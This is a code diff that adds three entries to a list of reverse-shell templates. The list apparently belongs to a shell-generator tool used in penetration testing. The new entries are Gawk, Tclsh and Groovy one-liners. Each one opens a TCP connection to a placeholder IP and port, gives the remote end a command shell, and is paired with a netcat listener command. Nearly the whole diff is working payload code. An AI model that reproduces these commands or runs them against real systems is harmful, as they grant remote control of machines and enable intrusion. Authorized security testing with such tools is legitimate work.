@@ -306,6 +306,28 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     os: ["linux"],
     listener: "nc -lvnp {PORT}",
   },
+  {
+    type: "gawk",
+    name: "Gawk",
+    icon: "📊",
+    command: "gawk 'BEGIN {s = \"/inet/tcp/0/{IP}/{PORT}\"; while(1) { printf \"shell> \" |& s; s |& getline c; if (c) { while ((c |& getline) > 0) print $0 |& s; close(c); } } }'",
+    description: "Gawk (GNU awk) reverse shell using networking features",
+    category: "reverse",
+    subcategory: "Scripting Languages",
+    os: ["linux"],
+    listener: "nc -lvnp {PORT}",
+  },
+  {
+    type: "tclsh",
+    name: "Tclsh",
+    icon: "🔤",
+    command: "echo 'set s [socket {IP} {PORT}];while {1} { puts -nonewline $s \"shell> \"; flush $s; gets $s c; set e \"exec $c\"; if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh",
+    description: "Tclsh (Tcl shell) reverse shell",
+    category: "reverse",
+    subcategory: "Scripting Languages",
+    os: ["linux"],
+    listener: "nc -lvnp {PORT}",
+  },
 
   // ========== Compiled Languages ==========
   {
@@ -342,6 +364,17 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
     category: "reverse",
     subcategory: "Compiled Languages",
     os: ["linux", "mac", "windows"],
+    listener: "nc -lvnp {PORT}",
+  },
+  {
+    type: "groovy",
+    name: "Groovy",
+    icon: "🎸",
+    command: "groovy -e 'String host=\"{IP}\";int port={PORT};String cmd=\"/bin/sh\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'",
+    description: "Groovy reverse shell",
+    category: "reverse",
+    subcategory: "Compiled Languages",
+    os: ["linux"],
     listener: "nc -lvnp {PORT}",
   },
 
